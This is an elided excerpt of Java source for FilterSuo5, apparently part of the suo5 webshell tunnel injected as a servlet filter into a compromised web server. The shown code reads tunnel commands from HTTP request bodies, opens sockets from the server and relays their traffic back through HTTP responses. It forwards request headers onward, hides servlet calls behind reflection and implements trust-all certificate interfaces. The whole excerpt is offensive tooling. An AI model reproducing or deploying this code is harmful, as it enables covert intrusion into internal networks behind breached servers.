...
public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public FilterSuo5(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }
    ...
    public void tryFullDuplex(Object request, Object response) throws Exception {
        InputStream in = (InputStream) invokeMethod(request.getClass(), request, "getInputStream", new Class[]{}, new Object[]{});
        byte[] data = new byte[32];
        readFull(in, data);
        OutputStream out = (OutputStream) invokeMethod(response.getClass(), response, "getOutputStream", new Class[]{}, new Object[]{});
        out.write(data);
        out.flush();
    }
    ...
    private void processDataBio(Object request, Object resp) throws Exception {
        final InputStream reqInputStream = (InputStream) invokeMethod(request.getClass(), request, "getInputStream", new Class[]{}, new Object[]{});
        HashMap dataMap = unmarshal(reqInputStream);

        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            invokeMethod(resp.getClass(), resp, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(403)});
            return;
        }
//        resp.setBufferSize(512);
        invokeMethod(resp.getClass(), resp, "setBufferSize", new Class[]{Integer.TYPE}, new Object[]{512});
        final OutputStream respOutStream = (OutputStream) invokeMethod(resp.getClass(), resp, "getOutputStream", new Class[]{}, new Object[]{});

        // 0x00 create socket
//        resp.setHeader("X-Accel-Buffering", "no");
        invokeMethod(resp.getClass(), resp, "setHeader", new Class[]{String.class, String.class}, new Object[]{"X-Accel-Buffering", "no"});
        Socket sc;
        try {
...
//                port = request.getLocalPort();
                port = (Integer) invokeMethod(request.getClass(), request, "getLocalPort", new Class[]{}, new Object[]{});
            }
            sc = new Socket();
...
//        resp.flushBuffer();
        ...
        Thread t = null;
        try {
            FilterSuo5 p = new FilterSuo5(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
...
//        InputStream is = request.getInputStream();
        InputStream is = (InputStream) invokeMethod(request.getClass(), request, "getInputStream", new Class[]{}, new Object[]{});
...
//        resp.setBufferSize(512);
        ...
        invokeMethod(resp.getClass(), resp, "setBufferSize", new Class[]{Integer.TYPE}, new Object[]{512});
        OutputStream respOutStream = (OutputStream) invokeMethod(resp.getClass(), resp, "getOutputStream", new Class[]{}, new Object[]{});
        if (action == 0x02) {
...
//        Enumeration headers = request.getHeaderNames();
        Enumeration headers = (Enumeration) invokeMethod(request.getClass(), request, "getHeaderNames", new Class[]{}, new Object[]{});
        while (headers.hasMoreElements()) {
            String k = (String) headers.nextElement();
//            conn.setRequestProperty(k, request.getHeader(k));
            conn.setRequestProperty(k, (String) invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{k}));
        }
